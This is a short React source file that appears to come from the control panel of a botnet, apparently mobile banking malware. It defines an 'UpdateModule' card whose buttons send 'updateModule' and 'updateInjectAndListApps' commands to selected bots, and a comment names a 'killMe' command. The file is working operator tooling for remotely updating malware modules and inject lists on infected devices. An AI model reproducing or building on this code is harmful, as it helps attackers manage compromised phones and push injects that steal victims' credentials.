import React from 'react';
import SettingsContext from '../../Settings';


//{"name":"killMe"}
class UpdateModule extends React.Component {

    constructor(props) {
        super(props);
    }

    onClickUpdateModule = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"updateModule"}');
            SettingsContext.ShowToast("success", "Send message to update module");
        }
    }
    
    onClickAppLists = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"updateInjectAndListApps"}');
            SettingsContext.ShowToast("success", "Send message to update apps list");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Update Module or app list</h5>
                    <h6 class="card-subtitle mb-2 text-muted">You can update bot module, or inject list on selected bots</h6>
                    <button type="button" onClick={this.onClickUpdateModule} class="btn btn-right btn-outline-warning">Update module</button>
                    <button type="button" onClick={this.onClickAppLists} class="btn btn-left btn-outline-warning">Update App Lists</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default UpdateModule;